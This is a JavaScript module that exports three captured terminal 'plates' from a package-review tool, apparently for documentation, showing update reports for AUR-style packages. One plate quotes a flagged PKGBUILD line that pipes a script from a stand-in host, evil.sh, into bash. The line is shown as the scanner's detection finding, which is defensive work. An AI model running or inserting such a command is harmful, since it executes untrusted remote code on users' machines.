// Exact output of `trustsight review` (default flags, no `--score`), captured
// from the tool's own renderer (src/trustsight/cli/review.py,
// _render_results_rich) at COLUMNS=70, ANSI codes stripped. Three outdated
// packages: a trivial bump, a flagged update, and one with a dependency
// mini-card. The tip line is the renderer's own `--deps` hint. Not hand-typed.

export const plateExample = `╭───────────────────────── chez-scheme-bin ──────────────────────────╮
│  Version  10.0.0  →  10.1.0                                        │
│  Status   Only pkgver and sha256sums changed. Review the diff      │
│           before building.                                         │
│  Changed  pkgver 10.0.0 -> 10.1.0                                  │
│           checksums added or changed                               │
╰────────────────────────────────────────────────────────────────────╯`

export const plateFlagged = `╭─────────────────────────── sketchy-pkg ────────────────────────────╮
│  Version  1.4.2  →  1.5.0                                          │
│  Status   The update is not trivial. Review it.                    │
│           PKGBUILD line 4  Remote Script Execution: curl           │
│           https://evil.sh | bash [R001]                            │
│           Source URL classified as unknown (https://evil.sh)       │
│           [SOURCE_BUCKET]                                          │
│  Changed  pkgver 1.4.2 -> 1.5.0                                    │
│           source host added: evil.sh                               │
╰────────────────────────────────────────────────────────────────────╯`

export const plateDeps = `╭──────────────────────── some-trusted-tool ─────────────────────────╮
│  Version       2.4.1  →  2.4.2                                     │
│  Status        The update is not trivial. Review it.               │
│                PKGBUILD line 17  Install hook performs a           │
│                privileged operation [R062]                         │
│  Changed       pkgver 2.4.1 -> 2.4.2                               │
│                                                                    │
│  Dependencies                                                      │
│                ╭──────────────── L1  libhelper ─────────────────╮  │
│                │ Findings 2                                     │  │
│                ╰────────────────────────────────────────────────╯  │
╰────────────────────────────────────────────────────────────────────╯`
